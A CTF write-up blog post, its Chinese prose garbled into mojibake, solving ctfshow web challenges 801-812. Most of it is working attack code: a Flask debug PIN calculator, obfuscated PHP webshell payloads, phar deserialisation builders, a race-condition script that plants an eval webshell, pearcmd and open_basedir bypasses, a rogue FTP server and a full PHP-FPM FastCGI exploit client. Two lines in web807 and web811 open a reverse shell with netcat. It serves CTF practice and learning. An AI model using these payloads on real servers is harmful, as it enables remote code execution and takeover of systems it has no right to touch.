---
title: ctfshow å¸¸è§å§¿åŠ¿
date: 2024-10-21 21:52:39
permalink: /pages/a43171/
categories:
  - wp
tags:
  - å¸¸è§å§¿åŠ¿
  - ctfshow
  - wp
  - ctf
author: 
  name: the0n3
  link: https://the0n3.top
---
# ctfshow å¸¸è§å§¿åŠ¿

## web801

flask pinå€¼è®¡ç®—ï¼Œè¯»å–æ–‡ä»¶ï¼Œè„šæœ¬è®¡ç®—pinç ã€‚æ¢­å“ˆ

éé¢„æœŸï¼š`url/file?filename=/flag`

é¢„æœŸï¼š

```python
import hashlib
from itertools import chain

probably_public_bits = [
    'root'  # usernameï¼Œé€šè¿‡/etc/passwd
    'flask.app',  # modnameï¼Œé»˜è®¤å€¼
    'Flask',  # é»˜è®¤å€¼
    '/usr/local/lib/python3.8/site-packages/flask/app.py' # moddirï¼Œé€šè¿‡æŠ¥é”™è·å¾—
]
# å¡«å…¥è·å–çš„16è¿›åˆ¶å³å¯ï¼Œåé¢æ·»åŠ äº†è½¬æ¢åŠŸèƒ½
address = '02:42:ac:0c:e8:a0'
address = int(address.replace(':', ''),16)
private_bits = [
    f'{address}',  # macåè¿›åˆ¶å€¼ /sys/class/net/eth0/address
    '225374fa-04bc-4346-9f39-48fa82829ca934b345d280f694439fa54c01aa968eef81f55a7e5baa3e39db57884e39217606'  # çœ‹ä¸Šé¢machine-idéƒ¨åˆ†
]

# ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
        else:
            rv = num

print(rv)

# ä¸‹é¢ä¸ºæºç é‡Œé¢æŠ„çš„ï¼Œä¸éœ€è¦ä¿®æ”¹
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

![1](/medias/show800/1.png)


## web802

é™åˆ¶éå­—æ¯æ•°å­—ï¼Œå¯ä»¥ç”¨å­—ç¬¦ï¼Œè‡ªå¢æ„é€ å­—ç¬¦

æ„é€ `$_GET[_]($_GET[__])`

```php
<?php
$___=((''/'').'')[''==_];# $___ = N
$____=((''/'').'')[''==''];# $____ = A
++$____;
++$____;
++$____;
$_____=++$____; # $_____ = E

++$____;
++$____;
$______ = $____; # $______ = G

++$___;++$___;++$___;++$___;++$___;
$_______=++$___; # $______ = T# 

$________='_'.$______.$_____.$_______;
$$________[_]($$________[__]); # $_GET[_]($_GET[__])
```

ç®€åŒ–

```php
$___=((''/'').'')[''==_];$____=((''/'').'')[''==''];++$____;++$____;++$____;$_____=++$____;++$____;++$____;$______ = $____;++$___;++$___;++$___;++$___;++$___;$_______=++$___;$________='_'.$______.$_____.$_______;$$________[_]($$________[__]);
```

æ•´ä¸ªpayloadä½¿ç”¨postå‘åŒ…ï¼Œurlç¼–ç ä¸€ä¸‹ï¼Œé¿å…`$`,`=`å…·æœ‰ç‰¹æ®Šè¯­æ„

![2](/medias/show800/2.png)

## web803

pharæ–‡ä»¶åŒ…å«ï¼Œç¬¬ä¸€æ¬¡æ¥è§¦ï¼Œåç»­è¯¦ç»†å­¦ä¹ ä¸€ä¸‹

è¿™é‡Œå®¡è®¡èµ·æ¥æœ‰ç‚¹å¥‡æ€ªï¼Œä¸å­˜åœ¨`$file.txt`å°±å†™ä¸€ä¸ª`$file`ï¼Œå†™äº†`$file`é‚£`$file.txt`ä¸è¿˜æ˜¯ä¸å­˜åœ¨ï¼Ÿé€šè¿‡`file_put_contents`å‡½æ•°ç›´æ¥å†™ğŸä¸ç°å®äº†ï¼Œå¯ä»¥äº†è§£åˆ°è¿™é‡Œå¯ä»¥é€šè¿‡pharæ‰“åŒ…ä¸€ä¸ª`$file.txt`åˆ°æœåŠ¡å™¨ï¼Œä½¿æ–‡ä»¶åŒ…å«æˆä¸ºäº†å¯èƒ½

```php
if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file.'.txt')){
        include $file.'.txt';
    }else{
        file_put_contents($file,$content);
    }
}
```

ç”Ÿæˆpharæ–‡ä»¶ï¼Œé‡Œé¢æ‰“åŒ…ä¸€ä¸ª`a.txt`ï¼Œå†…å®¹ä¸º`<?php highlight_file(__FILE__);eval($_POST[1]);?>`

```php
<?php
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "<?php highlight_file(__FILE__);eval(\$_POST[1]);?>");
$phar->stopBuffering();
?>
```

ä½¿ç”¨pythonå‘åŒ…

```python
import requests

url="http://7fce7e3d-4206-4f91-b196-7536bde12046.challenge.ctf.show/"

data1={'file':'/tmp/a.phar','content':open('shell.phar','rb').read()}
r = requests.post(url,data=data1)
print(r.text)
```

é€šè¿‡pharåè®®åŒ…å«æ–‡ä»¶

![3](/medias/show800/3.png)

## web804

unlinkä¼šè§¦å‘ååºåˆ—åŒ–

```php
class hacker{
    public $code;
    public function __destruct(){
        eval($this->code);
    }
}

$file = $_POST['file'];
$content = $_POST['content'];

if(isset($content) && !preg_match('/php|data|ftp/i',$file)){
    if(file_exists($file)){
        unlink($file);
    }else{
        file_put_contents($file,$content);
    }
}
```

é‡ç‚¹åœ¨`hacker`ç±»ææ„å‡½æ•°å­˜åœ¨å‘½ä»¤æ‰§è¡Œ

```php
<?php 
class hacker{
    public $code = 'system("tac /f*;tac f*");';
}
$a=new hacker();
$phar = new Phar("shell.phar");
$phar->startBuffering();
$phar->setMetadata($a);
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar->addFromString("a.txt", "111");
$phar->stopBuffering();
?>
```

pythonå‘åŒ…

```python
import requests

url="http://4d03da6f-da2a-4b1e-beb3-b1ad422e3af6.challenge.ctf.show/"

data1={'file':'/tmp/aa.phar','content':open('shell.phar','rb').read()}
r = requests.post(url,data=data1)
print(r.text)
```

![4](/medias/show800/4.png)


## web805

é€šè¿‡phpinfo()å‡½æ•°å›æ˜¾çœ‹åˆ°é™å®šäº†ç›®å½•ï¼Œç¦ç”¨äº†ç³»ç»Ÿå‘½ä»¤å‡½æ•°

```plaintext
open_basedir	/var/www/html
disable_classes	SoapClient,mysqli,mysql,pdo,phar
disable_functions	system,exec,shell_exec,passthru,popen,fopen,popen,pcntl_exe	
```

å‚è€ƒæ–‡ç« [open_basedirç»•è¿‡](https://www.v0n.top/2020/07/10/open_basedir%E7%BB%95%E8%BF%87/)

å­¦ä¹ åˆ°ä¸€äº›å§¿åŠ¿

é€šè¿‡glob://åè®®å’ŒåŸç”Ÿç±»æ­é…åˆ©ç”¨ï¼Œå¯ä»¥åˆ—å‡ºæ ¹ç›®å½•æ–‡ä»¶

![5](/medias/show800/5.png)

```php
1=$it = new DirectoryIterator("glob:///*");
foreach($it as $f) {
    printf($f->getFilename()."  ");
}
```

å°è¯•ä½¿ç”¨åŸç”Ÿç±»è¯»å–ï¼Œå¤±è´¥äº†ã€‚çœ‹äº†å•æ˜¯åŸç”Ÿç±»ç»•ä¸è¿‡å»

```php
$f = new SplFileObject("php://filter/convert.base64-encode/resource=/ctfshowflag");
echo $f->fread($f->getSize());
```

scandir()å‡½æ•°æ­é…glob://åè®®ï¼Œä¹Ÿå¯ä»¥åˆ—å‡ºæ ¹ç›®å½•æ–‡ä»¶

```php
var_dump(scandir('glob:///*'));
```

ä¸€ä¸ªç»•è¿‡æ€è·¯

åœ¨å½“å‰æ–‡ä»¶å¤¹`/var/www/html`é‡Œå»ºç«‹äº†å­æ–‡ä»¶å¤¹`test`ï¼Œè¿›å…¥äº†å­æ–‡ä»¶å¤¹testï¼Œåˆ©ç”¨ini_setå‡½æ•°ï¼ŒæŠŠ`/var/www/html`ä¸‹çš„å­ç›®å½•testä¸‹ï¼Œä½¿ç”¨ini_setå‡½æ•°è®¾ç½®`..`ä¸Šä¸€çº§ç›®å½•ï¼Œä¹Ÿå°±æ˜¯`/var/www/html`ç›®å½•

æˆ‘çš„æ€è€ƒï¼šè¿™é‡Œçš„`..`å­˜åœ¨åŒé‡å«ä¹‰

- /var/www/html
- ..

å› æ­¤ï¼Œäº§ç”Ÿäº†ç›®å½•ç©¿è¶Šçš„åˆ©ç”¨ç‚¹ï¼Œé€šè¿‡chdirå‡½æ•°ä¸€ç›´åˆ‡åˆ°äº†æ ¹ç›®å½•ï¼Œæœ€åæŠŠopen_basedirè®¾ç½®åœ¨äº†æ ¹ç›®å½•ï¼Œä½¿highlight_fileå‡½æ•°è¯»å–äº†flagæˆäº†å¯èƒ½

```php
mkdir('test');
chdir('test');
var_dump(ini_set('open_basedir','..'));
chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');
var_dump(ini_set('open_basedir','/'));
highlight_file('ctfshowflag');
```

## web806

phpæ— å‚RCE

åªèƒ½ä½¿ç”¨æ— å‚å‡½æ•°

```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
```

å¥½åœ¨åœ¨ctfshowå‘½ä»¤æ‰§è¡Œé¢˜å•ä¸­è®°å½•äº†ä¸€ä¸‹payloadï¼Œè·å–æœ€åä¸€ä¸ªå®šä¹‰çš„å˜é‡å¹¶æ‰§è¡Œï¼Œç¨‹åºé‡Œæœ€åä¸€ä¸ªå®šä¹‰çš„æ— æ³•æ§åˆ¶ï¼Œå¯ä»¥åœ¨posté‡Œä¼ å…¥ä¸€ä¸ªæ¥æ‰§è¡Œ

```php
eval(array_pop(next(get_defined_vars())));
```

![6](/medias/show800/6.png)

## web807

é¢˜ç›®ä½¿ç”¨äº†`shell_exec`å‡½æ•°ï¼Œæƒ³å°è¯•å†™æ–‡ä»¶æ¥ç€ï¼Œå¥½åƒæ²¡æœ‰å†™ï¼Œåªèƒ½å¼¹ä¸ªshelläº†

```bash
https://baidu.com;nc ip port -e /bin/sh;
```

## web808

sessionæ–‡ä»¶åŒ…å«ï¼Œè„šæœ¬æ¡ä»¶ç«äº‰

![7](/medias/show800/7.png)

```php
import io
import requests
import threading
# å¦‚æœé¢˜ç›®é“¾æ¥æ˜¯httpsï¼Œæ¢æˆhttp
# url = 'https://85a94ccd-c8d7-40ac-ae8f-38ce8f7febb6.challenge.ctf.show/'
url = 'http://092d8949-e4c3-4d0b-8478-240a371fd53c.challenge.ctf.show/'
sessionid = 'ctfshow'

def write(session): # å†™å…¥ä¸´æ—¶æ–‡ä»¶
    while True:
        fileBytes = io.BytesIO(b'a'*1024*50) # 50kb
        session.post(url,
        cookies = {'PHPSESSID':sessionid},
        data = {'PHP_SESSION_UPLOAD_PROGRESS':'<?php file_put_contents("shell.php","<?php highlight_file(__FILE__);eval(\$_GET[1]);?>");?>'},
        files={'file':('1.jpg',fileBytes)}
        )

def read(session):
    while True:
        session.get(url + '?file=/tmp/sess_' + sessionid) # è¿›è¡Œæ–‡ä»¶åŒ…å«
        r = session.get(url+'shell.php') # æ£€æŸ¥æ˜¯å¦å†™å…¥ä¸€å¥è¯æœ¨é©¬
        if r.status_code == 200:
            print('OK')
            return ''

evnet=threading.Event() # å¤šçº¿ç¨‹

session = requests.session()
for i in range(5):
    threading.Thread(target = write,args = (session,)).start()
for i in range(5):
    threading.Thread(target = read,args = (session,)).start()

evnet.set()
```

## web809

è¿‡æ»¤çš„ä¸å¤Ÿä¸¥æ ¼ï¼Œä¸Šä¸€é¢˜çš„è„šæœ¬ä»ç„¶å¯ä»¥è·‘

![8](/medias/show800/8.png)

å­¦ä¹ ä¸‹é¢˜ç›®çš„é¢„æœŸè€ƒå¯ŸçŸ¥è¯†`pear`ï¼Œå¾ˆæ–°å¥‡ï¼Œç¬¬ä¸€æ¬¡ç¢°åˆ°

å¼•å…¥**Pç‰›**å¸ˆå‚…åŸè¯

::: tip
peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œè€Œpearæ˜¯peclä¾èµ–çš„ç±»åº“ã€‚åœ¨7.3åŠä»¥å‰ï¼Œpecl/pearæ˜¯é»˜è®¤å®‰è£…çš„ï¼›åœ¨7.4åŠä»¥åï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç¼–è¯‘PHPçš„æ—¶å€™æŒ‡å®š--with-pearæ‰ä¼šå®‰è£…ã€‚
:::

åŸæœ¬pear/pcelæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¹¶ä¸åœ¨Webç›®å½•ä¸‹ï¼Œå³ä½¿å­˜åœ¨ä¸€äº›å®‰å…¨éšæ‚£ä¹Ÿæ— éœ€æ‹…å¿ƒã€‚ä½†æˆ‘ä»¬é‡åˆ°çš„åœºæ™¯æ¯”è¾ƒç‰¹æ®Šï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶åŒ…å«çš„åœºæ™¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åŒ…å«åˆ°pearä¸­çš„æ–‡ä»¶ï¼Œè¿›è€Œåˆ©ç”¨å…¶ä¸­çš„ç‰¹æ€§æ¥æäº‹

å…ˆåŒ…å«`pear`æ–‡ä»¶ï¼Œåˆ©ç”¨phpçš„å‘½ä»¤è¡Œå‚æ•°`config-create`å†™æ–‡ä»¶ï¼Œæ‰€ä»¥payloadï¼š

payloadé‡Œå­˜åœ¨`&`,`+`ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œç›´æ¥ä½¿ç”¨hackbarå‘åŒ…ä¼šè¢«ç¼–ç å¤±å»åŸæ„ï¼Œå¯¼è‡´æ‰§è¡Œå¤±è´¥ï¼Œæ‰€ä»¥è¦ä½¿ç”¨bpå‘åŒ…

```php
?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=highlight_file(__FILE__);eval($_POST[1]);?>+/tmp/11
```

å¤©é©¬è¡Œç©º

![9](/medias/show800/9.png)

## web810

SSRFæ‰“PHP-FPM

é¡¹ç›®åœ°å€https://github.com/tarunkant/Gopherusï¼Œå·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://github.com/tarunkant/Gopherus/archive/refs/heads/master.zip

```bash
mkdir web810
cd web810
wget https://github.com/tarunkant/Gopherus/archive/refs/heads/master.zip
unzip master.zip
cd Gopherus-master
python2 gopherus.py --exploit fastcgi
```
æ‹¿åˆ°çš„payloadï¼Œåœ¨`gopher://127.0.0.1:9000/`åçš„å†…å®¹è¿˜éœ€è¦å†urlç¼–ç ä¸€ä¸‹

![10](/medias/show800/10.png)

![11](/medias/show800/11.png)

## web811

file_put_contentsæ‰“PHP-FPM

åˆ©ç”¨FTPåè®®çš„è¢«åŠ¨æ¨¡å¼ï¼Œå³ï¼šå¦‚æœä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾ä»FTPæœåŠ¡å™¨ä¸Šè¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼ˆæˆ–å†™å…¥ï¼‰ï¼ŒæœåŠ¡å™¨ä¼šé€šçŸ¥å®¢æˆ·ç«¯å°†æ–‡ä»¶çš„å†…å®¹è¯»å–ï¼ˆæˆ–å†™ï¼‰åˆ°ä¸€ä¸ªæœ‰æœåŠ¡ç«¯æŒ‡å®šçš„IPå’Œç«¯å£ä¸Šã€‚è€Œä¸”ï¼Œè¿™é‡Œå¯¹è¿™äº›IPå’Œç«¯å£æ²¡æœ‰è¿›è¡Œå¿…è¦çš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨å¯ä»¥å‘Šè¯‰å®¢æˆ·ç«¯è¿æ¥åˆ°è‡ªå·±çš„æŸä¸€ä¸ªç«¯å£ï¼Œå¦‚æœå®ƒæ„¿æ„çš„è¯ã€‚å‡è®¾æ­¤æ—¶å‘ç°å†…ç½‘ä¸­å­˜åœ¨ PHP-FPMï¼Œé‚£æˆ‘ä»¬å¯ä»¥é€šè¿‡ FTP çš„è¢«åŠ¨æ¨¡å¼æ”»å‡»å†…ç½‘çš„ PHP-FPMã€‚

é‡ç‚¹åœ¨ï¼Œftpåè®®è¿æ¥ç›®æ ‡æœåŠ¡å™¨æ—¶ï¼Œç›®æ ‡æœåŠ¡å™¨å¯ä»¥æŒ‡å®šä½¿ç”¨ftpå®¢æˆ·ç«¯çš„ipå’Œç«¯å£

é‚£ä¹ˆåœ¨`file_put_contents($file, $content);`å‡½æ•°è¿™é‡Œï¼Œå¦‚æœ`$file`æ˜¯è¿œç¨‹ftpæœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡ç«¯è¿›è¡Œè®¾ç½®ï¼Œè®©`$file`æŒ‡å‘`127.0.0.1:9000`ï¼Œä½¿ç”¨`gopherus`ç”Ÿæˆä¸€ä¸ªå¯¹php-fpmåˆ©ç”¨çš„payloadèµ‹å€¼ç»™`$content`

è¿™æ ·åœ¨è¿æ¥ftpæœåŠ¡å™¨åï¼ŒæŒ‡å®šåˆ°`127.0.0.1:9000`ï¼Œphp-fpmæ¥æ”¶åˆ°$contentæ•°æ®åŒ…æ—¶å¯ä»¥å®ç°æ‰§è¡Œå‘½ä»¤

è¿œç¨‹å¼€å¯ftpåè®®

```python
# -*- coding: utf-8 -*-
# evil_ftp.py
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 23))        # ftpæœåŠ¡ç»‘å®š23å·ç«¯å£
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2) 
# "127,0,0,1"PHP-FPMæœåŠ¡ä¸ºå—å®³è€…æœ¬åœ°ï¼Œ"9000"ä¸ºä¸ºPHP-FPMæœåŠ¡çš„ç«¯å£å·
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

åˆ©ç”¨gopherusç”Ÿæˆpayload

```bash
python2 gopherus.py --exploit fastcgi
/var/www/html/index.php
nc ip port -e /bin/sh
```

è¿™ä¸€é¢˜åªåˆ©ç”¨ä¸‹åˆ’çº¿åé¢çš„å†…å®¹ï¼Œä¸ç”¨å†æ¬¡urlç¼–ç ï¼Œä¸Šä¸€é¢˜urlç¼–ç æ˜¯å› ä¸ºgetä¼ å‚ä¼šè§£ç ä¸€æ¬¡ï¼Œcurlå‡½æ•°ä¼šè§£ç ä¸€æ¬¡ï¼Œæ‰€ä»¥è¦å¤šç¼–ç ä¸€æ¬¡

![12](/medias/show800/12.png)

åˆ©ç”¨ï¼š

æ³¨æ„ï¼Œftpåè®®ç«¯å£åé¢åŠ ä¸ªæ–œæ ï¼Œä»£è¡¨è®¿é—®æ ¹ç›®å½•

```plaintext
url?file=ftp://ip:21/&content=payload
```

![13](/medias/show800/13.png)


## web812

PHP-FPMæœªæˆæƒ

è¯¦ç»†åŸç†ï¼š[PHP-FPM è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´](https://github.com/JnuSimba/MiscSecNotes/blob/master/æ¼æ´ç§‘æ™®/PHP-FPM%20è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´.md)

ç®€å•è®²ï¼šPHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ï¼ŒPHP-FPMçš„æœåŠ¡ç«¯å£æ²¡æœ‰åšé‰´æƒè®¤è¯ï¼Œå…è®¸å…¶ä»–ä¸»æœºé€šè¿‡FastCGIåè®®è¿æ¥åˆ°PHP-FPMï¼Œè¿›è¡Œé€šä¿¡ã€‚å¯ä»¥é€šè¿‡ä¿®æ”¹fastcgiæŠ¥æ–‡ï¼Œå®ç°ä¿®æ”¹phpçš„é…ç½®æ–‡ä»¶å†…å®¹ï¼Œåˆ©ç”¨phpçš„æ–‡ä»¶åŒ…å«é…ç½®é¡¹`auto_prepend_file`ã€`auto_append_file`å’Œ`php://input`ï¼Œå®ç°æ¶æ„æ–‡ä»¶åŒ…å«RCE

ç›´æ¥åˆ©ç”¨expå§

::: details
```python
import socket
import random
import argparse
import sys
from io import BytesIO

# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client

PY2 = True if sys.version_info.major == 2 else False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])

def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)

def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')

def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''
            
            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        if not self.__connect():
            print('connect failure! please check your fasctcgi-server !!')
            return

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

        self.sock.send(request)
        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        self.requests[requestId]['response'] = b''
        return self.__waitForResponse(requestId)

    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf

        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
    parser.add_argument('host', help='Target host, such as 127.0.0.1')
    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php system("cat /flagfile"); exit; ?>')
    parser.add_argument('-p', '--port', help='FastCGI port', default=28074, type=int)

    args = parser.parse_args()

    client = FastCGIClient(args.host, args.port, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = args.file
    content = args.code
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(content),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
    response = client.request(params, content)
    print(force_text(response))
```
:::

expç”¨æ³•ï¼š

```bash
python3 exp.py -c '<?php phpä»£ç ?>' -p ç«¯å£ pwn.challenge.ctf.show å­˜åœ¨çš„phpæ–‡ä»¶
```


æ–‡ä»¶åŒ…å«ï¼Œéœ€è¦ä¸€ä¸ªå­˜åœ¨çš„phpæ–‡ä»¶ï¼Œæœ€ç®€å•çš„æ¥åšï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨`/var/www/html/index.php`

payloadï¼š

```python
 python3 exp.py -c '<?php system("cat /f*");?>' -p 28141 pwn.challenge.ctf.show /var/www/html/index.php
```

![14](/medias/show800/14.png)


é™¤äº†index.phpå¤–ï¼Œè¿˜å¯ä»¥æœ¬åœ°dockerå¤ç°ä¸€ä¸ªä¸é¢˜ç›®ç¯å¢ƒç›¸åŒçš„phpç¯å¢ƒï¼Œåœ¨phpçš„ç›®å½•ä¸‹ï¼Œæ‰¾å­˜åœ¨çš„phpæ–‡ä»¶å°è¯•åŒ…å«

```bash
docker run -d -p 80:80 --name myphp php:7.3-apache
```

è¿›å…¥å®¹å™¨å‘½ä»¤è¡Œ

```bash
docker exec -it myphp /bin/bash
ls /usr/local/lib/php/
```

![15](/medias/show800/15.png)

